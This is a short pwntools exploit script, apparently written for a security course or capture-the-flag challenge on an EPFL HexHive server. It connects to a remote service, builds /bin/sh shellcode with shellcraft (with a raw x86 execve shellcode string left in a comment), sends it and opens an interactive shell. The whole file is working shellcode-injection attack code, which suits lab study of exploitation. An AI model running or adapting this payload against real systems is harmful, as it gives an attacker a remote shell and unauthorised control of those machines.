from pwn import *

io = remote("hexhive005.iccluster.epfl.ch", 9021)

pty = process.PTY

elf = context.binary = ELF("./exe_shell")

# io.recvline()

payload = asm(shellcraft.sh())          # The shellcode


# payload = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
print(payload)

io.sendline(payload)

# io.recvline()

io.interactive()
